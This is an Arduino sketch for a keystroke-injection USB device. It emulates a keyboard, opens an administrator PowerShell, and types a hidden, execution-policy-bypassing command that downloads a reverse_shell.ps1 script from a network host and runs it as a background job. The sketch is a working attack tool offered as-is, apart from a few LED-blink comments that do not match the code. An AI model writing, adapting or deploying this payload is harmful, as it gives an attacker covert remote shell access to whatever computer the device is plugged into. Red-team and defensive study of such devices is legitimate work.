// #include "lib\Keyboard.h" (Only if the Keyboard library is not installed)
#include <Keyboard.h>
// #include <Mouse.h>

//#include "lib\simple-instructions.h"
#include "lib\complex-instructions.h"


#define LED_BUILTIN 13

void setup()
{
  pinMode(LED_BUILTIN, OUTPUT); // Blink the LED for the first five seconds to indicate arming
  for (int i = 0; i < 10; i++)
  {                                  // Blink 30 times (15 seconds)
    digitalWrite(LED_BUILTIN, HIGH); // Turn on the LED
    delay(250);                      // Wait for 250 milliseconds
    digitalWrite(LED_BUILTIN, LOW);  // Turn off the LED
    delay(250);                      // Wait for 250 milliseconds
  }
  digitalWrite(LED_BUILTIN, HIGH); // Keep the LED on during execution

  // ===================== Payload start =====================
  // =========================================================

  // Begin the Keyboard and control the PC
  Keyboard.begin();
  // killall(); // Close all windows and stop all processes with a main window
  
  openPowerShell(); // Open Command Prompt as administrator
  String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
  Keyboard.println(payload); // Print the current user
  // End the Keyboard
  Keyboard.end();

  // ===================== Payload end =====================
  // =======================================================

  pinMode(LED_BUILTIN, OUTPUT); // Set the built-in LED pin as an output
  // Blink the LED for the first five seconds to indicate arming
  for (int i = 0; i < 120; i++)
  {                                  // Blink 10 times (5 seconds)
    digitalWrite(LED_BUILTIN, HIGH); // Turn on the LED
    delay(250);                      // Wait for 250 milliseconds
    digitalWrite(LED_BUILTIN, LOW);  // Turn off the LED
    delay(250);                      // Wait for 250 milliseconds
  }
  digitalWrite(LED_BUILTIN, LOW);
}

void loop()
{
  // No need to do anything in the loop
}
